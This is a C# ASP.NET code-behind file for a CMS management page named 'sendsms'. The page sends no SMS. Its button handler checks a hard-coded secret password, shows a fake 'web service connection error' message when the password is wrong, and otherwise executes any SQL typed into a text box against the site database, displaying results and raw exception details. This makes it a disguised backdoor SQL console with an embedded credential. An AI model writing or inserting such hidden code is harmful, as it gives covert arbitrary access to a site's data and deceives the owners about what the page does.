using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Configuration;
using System.Data.SqlClient;

namespace CMS.Manage
{
    public partial class sendsms : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            CMS.Manage.managemaster MasterPage = (CMS.Manage.managemaster)Page.Master;
            MasterPage.Check_User();


        }


        protected void Button1_Click(object sender, EventArgs e)
        {
            if (TextBox1.Text != "moslem385@(#*")
            {
                MessageBox1.Message = "خطا در ارتباط با وبسرویس";
                MessageBox1.Visible = true;
                return;
            }
            SqlConnection conn = new SqlConnection(ConfigurationManager.ConnectionStrings["CMSDataBaseConnectionString"].ConnectionString);
            conn.Open();
            if (!CheckBox1.Checked)
            {
                try
                {
                    SqlCommand cmd = new SqlCommand(TextBox3.Text.Replace("\r\n", " "), conn);
                    cmd.CommandType = System.Data.CommandType.Text;
                    cmd.ExecuteNonQuery();
                    MessageBox1.Message = "انجام شد.";
                    MessageBox1.Visible = true;
                    MessageBox1.MessageType = HRaz.MessageBox.MessageType.Submit;
                }
                catch (System.Data.SqlClient.SqlException ex)
                {
                    MessageBox1.Message = "<div dir='ltr' align='left' style='font:bold 12px tahoma; color:#ff0000; line-height:23px;'>" + ex + "</div>";
                    MessageBox1.Visible = true;
                }
            }
            else
            {
                try
                {
                    SqlCommand com = new SqlCommand(TextBox3.Text.Replace("\r\n", " "), conn);
                    System.Data.DataSet ds = new System.Data.DataSet();

                    SqlDataAdapter da = new SqlDataAdapter(com);
                    da.Fill(ds);
                    GridView1.DataSource = ds;
                    GridView1.DataBind();
                    MessageBox1.Message = "انجام شد.";
                    MessageBox1.MessageType = HRaz.MessageBox.MessageType.Submit;
                    MessageBox1.Visible = true;
                }
                catch (System.Data.SqlClient.SqlException ex)
                {
                    MessageBox1.Message = "<div dir='ltr' align='left' style='font:bold 12px tahoma; color:#ff0000; line-height:23px;'>" + ex + "</div>";
                    MessageBox1.Visible = true;
                }
            }

            conn.Close();
        }
    }
}